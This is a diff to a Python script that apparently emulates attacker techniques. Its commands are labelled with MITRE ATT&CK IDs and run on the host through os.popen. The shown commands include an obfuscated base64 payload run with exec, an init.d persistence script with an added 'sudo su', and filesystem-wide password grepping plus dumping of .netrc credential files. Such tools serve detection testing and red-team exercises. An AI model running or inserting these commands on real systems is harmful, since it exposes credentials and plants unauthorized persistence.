@@ -19,6 +19,7 @@ evil_cmd = '''python -c \\"import os, base64;exec(base64.b64decode('aW1wb3J0IHNv
 
 
 T1543_002 = '''
+sudo su
 cat > /etc/init.d/T1543.002 << EOF
 #!/bin/bash
 ### BEGIN INIT INFO
@@ -45,7 +46,7 @@ systemctl restart T1543.002
 '''
 
 T1552_001 = '''
-grep -ri password /
+grep -ri password / 2> /dev/null
 for file in $(find / -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
 '''
 
@@ -183,16 +184,16 @@ for i in range(len(TTP_LIST_LINUX)):
     try:
         print(datetime.datetime.now())
         print("")
-        print(bcolors.BOLD + bcolors.FAIL + "Executing " + bcolors.OKGREEN + TTP_NUMBERS_MAC[i] + bcolors.ENDC)
+        print(bcolors.BOLD + bcolors.FAIL + "Executing " + bcolors.OKGREEN + TTP_NUMBERS_LINUX[i] + bcolors.ENDC)
         print("")
         print(TTP_LIST_LINUX[i])
         print("")
         os.popen(TTP_LIST_LINUX[i]).read()  # UNCOMMENT THIS WHEN YOU PLAN TO EXECUTE THE TTPS
-        print('-'*80)
+        print('-'*160)
         with open('log.txt', 'a') as log:
             log.write(str(datetime.datetime.now()))
             log.write("\n\n")
-            log.write(bcolors.BOLD + bcolors.FAIL + "Executing " + bcolors.OKGREEN + TTP_NUMBERS_MAC[i] + bcolors.ENDC)
+            log.write(bcolors.BOLD + bcolors.FAIL + "Executing " + bcolors.OKGREEN + TTP_NUMBERS_LINUX[i] + bcolors.ENDC)
             log.write("\n")
             log.write(TTP_LIST_LINUX[i])
             log.write("\n")
